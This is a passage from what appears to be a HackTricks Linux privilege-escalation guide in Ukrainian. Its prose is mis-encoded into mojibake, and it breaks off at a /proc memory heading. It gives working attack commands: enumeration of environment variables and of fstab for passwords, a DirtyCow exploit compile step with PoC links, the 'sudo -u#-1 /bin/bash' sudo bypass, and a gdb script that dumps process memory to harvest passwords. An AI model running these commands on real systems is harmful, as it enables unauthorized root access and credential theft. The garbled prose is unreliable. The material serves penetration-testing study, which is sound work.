# –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ Linux

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Å–∏—Å—Ç–µ–º—É

### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –û–°

–î–∞–≤–∞–π—Ç–µ –ø–æ—á–Ω–µ–º–æ –∑–¥–æ–±—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ –∑–Ω–∞–Ω–Ω—è –ø—Ä–æ –û–°, —è–∫–∞ –ø—Ä–∞—Ü—é—î.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### –®–ª—è—Ö

–Ø–∫—â–æ —É –≤–∞—Å **—î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É –±—É–¥—å-—è–∫—ñ–π –ø–∞–ø—Ü—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–º—ñ–Ω–Ω–æ—ó `PATH`**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞—Ö–æ–ø–∏—Ç–∏ –¥–µ—è–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∞–±–æ –≤–∏–∫–æ–Ω—É—é—á—ñ —Ñ–∞–π–ª–∏:
```bash
echo $PATH
```
### –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ

–¶—ñ–∫–∞–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, –ø–∞—Ä–æ–ª—ñ –∞–±–æ –∫–ª—é—á—ñ API –≤ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞?
```bash
(env || set) 2>/dev/null
```
### –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —è–¥—Ä–∞

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –≤–µ—Ä—Å—ñ—é —è–¥—Ä–∞ —Ç–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
–ú–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ö–æ—Ä–æ—à–∏–π —Å–ø–∏—Å–æ–∫ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö —è–¥–µ—Ä —Ç–∞ –¥–µ—è–∫—ñ –≤–∂–µ **—Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏** —Ç—É—Ç: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) —Ç–∞ [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
–Ü–Ω—à—ñ —Å–∞–π—Ç–∏, –¥–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ **—Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

–î–ª—è –≤–∏–ª—É—á–µ–Ω–Ω—è –≤—Å—ñ—Ö –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –≤–µ—Ä—Å—ñ–π —è–¥—Ä–∞ –∑ —Ü—å–æ–≥–æ –≤–µ–±-—Å–∞–π—Ç—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ–ø–æ–º–æ–≥—Ç–∏ —É –ø–æ—à—É–∫—É –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤ —è–¥—Ä–∞:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (–≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞ –∂–µ—Ä—Ç–≤—ñ, –ø–µ—Ä–µ–≤—ñ—Ä—è—î –µ–∫—Å–ø–ª–æ–π—Ç–∏ –ª–∏—à–µ –¥–ª—è —è–¥—Ä–∞ 2.x)

–ó–∞–≤–∂–¥–∏ **—à—É–∫–∞–π—Ç–µ –≤–µ—Ä—Å—ñ—é —è–¥—Ä–∞ –≤ Google**, –º–æ–∂–ª–∏–≤–æ, –≤–∞—à–∞ –≤–µ—Ä—Å—ñ—è —è–¥—Ä–∞ –Ω–∞–ø–∏—Å–∞–Ω–∞ –≤ —è–∫–æ–º—É—Å—å –µ–∫—Å–ø–ª–æ–π—Ç—ñ, —Ç–æ–¥—ñ –≤–∏ –±—É–¥–µ—Ç–µ –≤–ø–µ–≤–Ω–µ–Ω—ñ, —â–æ —Ü–µ–π –µ–∫—Å–ø–ª–æ–π—Ç —î –¥—ñ–π—Å–Ω–∏–º.

### CVE-2016-5195 (DirtyCow)

–ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ Linux - –Ø–¥—Ä–æ Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### –í–µ—Ä—Å—ñ—è Sudo

–ù–∞ –æ—Å–Ω–æ–≤—ñ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –≤–µ—Ä—Å—ñ–π sudo, —è–∫—ñ –∑—É—Å—Ç—Ä—ñ—á–∞—é—Ç—å—Å—è –≤:
```bash
searchsploit sudo
```
–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —î –≤–µ—Ä—Å—ñ—è sudo –≤—Ä–∞–∑–ª–∏–≤–æ—é –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—ñ—î—ó –∫–æ–º–∞–Ω–¥–∏ grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

–í—ñ–¥ @sickrov
```
sudo -u#-1 /bin/bash
```
### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—ñ–¥–ø–∏—Å—É Dmesg –Ω–µ –≤–¥–∞–ª–∞—Å—è

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **smasher2 box of HTB** –¥–ª—è **–ø—Ä–∏–∫–ª–∞–¥—É**, —è–∫ —Ü—é —É—Ä–∞–∑—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏
```bash
dmesg 2>/dev/null | grep "signature"
```
### –î–æ–¥–∞—Ç–∫–æ–≤–∞ —Å–∏—Å—Ç–µ–º–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## –í–∏–±—ñ—Ä –º–æ–∂–ª–∏–≤–∏—Ö –∑–∞—Ö–∏—Å—Ç—ñ–≤

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## –í—Ç–µ—á–∞ –∑ Docker

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ Docker, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤—Ç–µ–∫—Ç–∏ –∑ –Ω—å–æ–≥–æ:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## –î–∏—Å–∫–∏

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **—â–æ –∑–º–æ–Ω—Ç–æ–≤–∞–Ω–æ —ñ –Ω–µ–∑–º–æ–Ω—Ç–æ–≤–∞–Ω–æ**, –¥–µ —ñ —á–æ–º—É. –Ø–∫—â–æ —â–æ—Å—å –Ω–µ–∑–º–æ–Ω—Ç–æ–≤–∞–Ω–æ, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–º–æ–Ω—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ —ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## –ö–æ—Ä–∏—Å–Ω–µ –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è

–ü–µ—Ä–µ—Ä–∞—Ö—É–π—Ç–µ –∫–æ—Ä–∏—Å–Ω—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
–¢–∞–∫–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –±—É–¥—å-—è–∫–∏–π –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä**. –¶–µ –∫–æ—Ä–∏—Å–Ω–æ, —è–∫—â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —è–∫–∏–π-–Ω–µ–±—É–¥—å –µ–∫—Å–ø–ª–æ–π—Ç —è–¥—Ä–∞, –æ—Å–∫—ñ–ª—å–∫–∏ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –π–æ–≥–æ –Ω–∞ –º–∞—à–∏–Ω—ñ, –¥–µ –≤–∏ –∑–±–∏—Ä–∞—î—Ç–µ—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ (–∞–±–æ –Ω–∞ –ø–æ–¥—ñ–±–Ω—ñ–π).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### –í—Ä–∞–∑–ª–∏–≤–µ –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–µ

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–≤–µ—Ä—Å—ñ—é –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö –ø–∞–∫–µ—Ç—ñ–≤ —Ç–∞ —Å–ª—É–∂–±**. –ú–æ–∂–ª–∏–≤–æ, —î —è–∫–∞—Å—å —Å—Ç–∞—Ä–∞ –≤–µ—Ä—Å—ñ—è Nagios (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥), —è–∫—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤...\
–†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—Ä—É—á–Ω—É –≤–µ—Ä—Å—ñ—é –Ω–∞–π–±—ñ–ª—å—à –ø—ñ–¥–æ–∑—Ä—ñ–ª–æ–≥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
–Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –º–∞—à–∏–Ω–∏ —á–µ—Ä–µ–∑ SSH, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **openVAS** –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏—Ö —Ç–∞ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö —É—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–∞—à–∏–Ω–∏.

{% hint style="info" %}
_–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü—ñ –∫–æ–º–∞–Ω–¥–∏ –ø–æ–∫–∞–∂—É—Ç—å –±–∞–≥–∞—Ç–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —è–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –±—É–¥–µ –Ω–µ–∫–æ—Ä–∏—Å–Ω–æ—é, —Ç–æ–º—É —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–∏, —Ç–∞–∫—ñ —è–∫ OpenVAS –∞–±–æ –ø–æ–¥—ñ–±–Ω—ñ, —è–∫—ñ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç—å, —á–∏ —î —è–∫–∞-–Ω–µ–±—É–¥—å –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –≤–µ—Ä—Å—ñ—è –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ –≤—ñ–¥–æ–º–∏—Ö –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤_
{% endhint %}

## –ü—Ä–æ—Ü–µ—Å–∏

–ü–æ–¥–∏–≤—ñ—Ç—å—Å—è, **—è–∫—ñ –ø—Ä–æ—Ü–µ—Å–∏** –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —è–∫–∏–π-–Ω–µ–±—É–¥—å –ø—Ä–æ—Ü–µ—Å –º–∞—î **–±—ñ–ª—å—à–µ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –Ω—ñ–∂ –ø–æ–≤–∏–Ω–µ–Ω** (–º–æ–∂–ª–∏–≤–æ, tomcat –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤—ñ–¥ —ñ–º–µ–Ω—ñ root?)
```bash
ps aux
ps -ef
top -n 1
```
–ó–∞–≤–∂–¥–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–ø—É—â–µ–Ω–∏—Ö [**–≤—ñ–¥–ª–∞–¥—á–∏–∫—ñ–≤ electron/cef/chromium**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤](electron-cef-chromium-debugger-abuse.md). **Linpeas** –≤–∏—è–≤–ª—è—î —ó—Ö, –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `--inspect` —É –∫–æ–º–∞–Ω–¥–Ω–æ–º—É —Ä—è–¥–∫—É –ø—Ä–æ—Ü–µ—Å—É.\
–¢–∞–∫–æ–∂ **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å–≤–æ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó –Ω–∞–¥ –±—ñ–Ω–∞—Ä–Ω–∏–º–∏ —Ñ–∞–π–ª–∞–º–∏ –ø—Ä–æ—Ü–µ—Å—ñ–≤**, –º–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–≥–æ—Å—å.

### –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –ø—Ä–æ—Ü–µ—Å—ñ–≤

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ [**pspy**](https://github.com/DominicBreuker/pspy) –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –ø—Ä–æ—Ü–µ—Å—ñ–≤. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è —á–∞—Å—Ç–æ –∞–±–æ –∫–æ–ª–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –ø–µ–≤–Ω—ñ –≤–∏–º–æ–≥–∏.

### –ü–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—ñ–≤

–î–µ—è–∫—ñ —Å–ª—É–∂–±–∏ —Å–µ—Ä–≤–µ—Ä–∞ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å **–ø–∞—Ä–æ–ª—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ —É –ø–∞–º'—è—Ç—ñ**.\
–ó–∞–∑–≤–∏—á–∞–π –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è **root-–ø—Ä–∏–≤—ñ–ª–µ—ó**, —â–æ–± –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—ñ–≤, —è–∫—ñ –Ω–∞–ª–µ–∂–∞—Ç—å —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º, —Ç–æ–º—É —Ü–µ –∑–∞–∑–≤–∏—á–∞–π –∫–æ—Ä–∏—Å–Ω–æ, –∫–æ–ª–∏ –≤–∏ –≤–∂–µ –º–∞—î—Ç–µ root-–ø—Ä–∞–≤–∞ —ñ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø–∞—Ä–æ–ª—ñ–≤.\
–û–¥–Ω–∞–∫ –ø–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ **—è–∫ –∑–≤–∏—á–∞–π–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∏ –º–æ–∂–µ—Ç–µ —á–∏—Ç–∞—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—ñ–≤, —è–∫—ñ –≤–∞–º –Ω–∞–ª–µ–∂–∞—Ç—å**.

{% hint style="warning" %}
–ó–∞—É–≤–∞–∂—Ç–µ, —â–æ –≤ –Ω–∞—à —á–∞—Å –±—ñ–ª—å—à—ñ—Å—Ç—å –º–∞—à–∏–Ω **–Ω–µ –¥–æ–∑–≤–æ–ª—è—é—Ç—å ptrace –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥—Ç–∏ —ñ–Ω—à—ñ –ø—Ä–æ—Ü–µ—Å–∏, —è–∫—ñ –Ω–∞–ª–µ–∂–∞—Ç—å –≤–∞—à–æ–º—É –Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ.

–§–∞–π–ª _**/proc/sys/kernel/yama/ptrace\_scope**_ –∫–æ–Ω—Ç—Ä–æ–ª—é—î –¥–æ—Å—Ç—É–ø–Ω—ñ—Å—Ç—å ptrace:

* **kernel.yama.ptrace\_scope = 0**: –≤—Å—ñ –ø—Ä–æ—Ü–µ—Å–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω—ñ, —è–∫—â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å —Ç–æ–π —Å–∞–º–∏–π uid. –¶–µ –∫–ª–∞—Å–∏—á–Ω–∏–π —Å–ø–æ—Å—ñ–± —Ä–æ–±–æ—Ç–∏ ptrace.
* **kernel.yama.ptrace\_scope = 1**: –º–æ–∂–Ω–∞ –Ω–∞–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏ –ª–∏—à–µ –±–∞—Ç—å–∫—ñ–≤—Å—å–∫–∏–π –ø—Ä–æ—Ü–µ—Å.
* **kernel.yama.ptrace\_scope = 2**: –¢—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ ptrace, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–æ—Ç—Ä–µ–±—É—î CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: –ù—ñ—è–∫—ñ –ø—Ä–æ—Ü–µ—Å–∏ –Ω–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é ptrace. –ü—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –≤–≤—ñ–º–∫–Ω–µ–Ω–Ω—è –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è.
{% endhint %}

#### GDB

–Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –ø–∞–º'—è—Ç—ñ —Å–ª—É–∂–±–∏ FTP (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥), –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ Heap —Ç–∞ —à—É–∫–∞—Ç–∏ –≤ –Ω—å–æ–º—É –ø–∞—Ä–æ–ª—ñ.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### –°—Ü–µ–Ω–∞—Ä—ñ–π GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

